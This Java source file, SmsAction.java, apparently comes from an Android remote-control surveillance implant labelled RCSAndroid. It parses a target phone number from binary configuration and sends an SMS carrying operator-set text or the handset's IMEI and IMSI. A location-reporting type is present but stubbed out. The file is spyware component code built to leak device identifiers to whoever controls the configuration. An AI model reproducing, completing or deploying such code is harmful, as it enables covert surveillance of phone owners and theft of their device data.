/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSAndroid
 * File         : SmsAction.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/
package com.ht.RCSAndroidGUI.action;

import java.io.IOException;

import android.content.Intent;
import android.net.Uri;

import com.ht.RCSAndroidGUI.Debug;
import com.ht.RCSAndroidGUI.Device;
import com.ht.RCSAndroidGUI.Status;
import com.ht.RCSAndroidGUI.utils.Check;
import com.ht.RCSAndroidGUI.utils.DataBuffer;
import com.ht.RCSAndroidGUI.utils.Utils;
import com.ht.RCSAndroidGUI.utils.WChar;

// TODO: Auto-generated Javadoc
/**
 * The Class SmsAction.
 */
public class SmsAction extends SubAction {

	// #ifdef DEBUG
	static Debug debug = new Debug("SmsAction");
	// #endif

	private static final int TYPE_LOCATION = 1;
	private static final int TYPE_SIM = 2;
	private static final int TYPE_TEXT = 3;

	String number;
	String text;
	int type;

	/**
	 * Instantiates a new sms action.
	 * 
	 * @param type
	 *            the type
	 * @param confParams
	 *            the conf params
	 */
	public SmsAction(final int type, final byte[] confParams) {
		super(type, confParams);
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.RCSAndroidGUI.action.SubAction#execute()
	 */
	@Override
	public boolean execute() {

		try {
			switch (type) {
			case TYPE_TEXT:
			case TYPE_SIM:
				return sendSMS(text);

			case TYPE_LOCATION:
				// http://supportforums.blackberry.com/t5/Java-Development/How-To-Get-Cell-Tower-Info-Cell-ID-LAC-from-CDMA-BB-phones/m-p/34538
				if (!getGPSPosition()) {
					errorLocation();
				}

				break;
			}
			return true;
		} catch (final Exception ex) {
			// #ifdef DEBUG
			debug.error(ex);
			// #endif
			return false;
		}
	}

	private void errorLocation() {
		if (!getCellPosition()) {
			sendSMS("Cell and GPS info not available");
		}
	}

	private boolean getCellPosition() {
		// TODO Auto-generated method stub
		return false;
	}

	private boolean getGPSPosition() {
		// TODO Auto-generated method stub
		return false;
	}

	private boolean sendSMS(final String text) {
		final Uri smsUri = Uri.parse("tel:" + number);
		final Intent intent = new Intent(Intent.ACTION_VIEW, smsUri);
		intent.putExtra("sms_body", text);
		intent.setType("vnd.android-dir/mms-sms");
		Status.getAppContext().startActivity(intent);
		return true;
	}

	protected boolean parse(final byte[] confParams) {
		final DataBuffer databuffer = new DataBuffer(confParams, 0,
				confParams.length);
		try {
			type = databuffer.readInt();

			// #ifdef DBC
			Check.asserts(type >= 1 && type <= 3, "wrong type");
			// #endif

			int len = databuffer.readInt();
			byte[] buffer = new byte[len];
			databuffer.read(buffer);
			number = Utils.Unspace(WChar.getString(buffer, true));

			switch (type) {
			case TYPE_TEXT:
				len = databuffer.readInt();
				buffer = new byte[len];
				databuffer.read(buffer);
				text = WChar.getString(buffer, true);
				break;
			case TYPE_LOCATION:
				// http://supportforums.blackberry.com/t5/Java-Development/How-To-Get-Cell-Tower-Info-Cell-ID-LAC-from-CDMA-BB-phones/m-p/34538
				break;
			case TYPE_SIM:
				final StringBuffer sb = new StringBuffer();
				final Device device = Device.self();
				if (Device.isCDMA()) {

					// sb.append("SID: " + device.getSid() + "\n");
					// sb.append("ESN: "
					// + NumberUtilities.toString(device.getEsn(), 16)
					// + "\n");
				} else {
					sb.append("IMEI: " + device.getImei() + "\n");
					sb.append("IMSI: " + device.getImsi() + "\n");
				}

				text = sb.toString();
				break;
			default:
				// #ifdef DEBUG
				debug.error("SmsAction.parse,  Unknown type: " + type);
				// #endif
				break;
			}

		} catch (final IOException e) {

			return false;
		}

		return true;
	}

	@Override
	public String toString() {
		final StringBuffer sb = new StringBuffer();
		sb.append("Sms type: " + type);
		sb.append(" number: " + number);
		sb.append(" text: " + text);

		return sb.toString();
	}

}
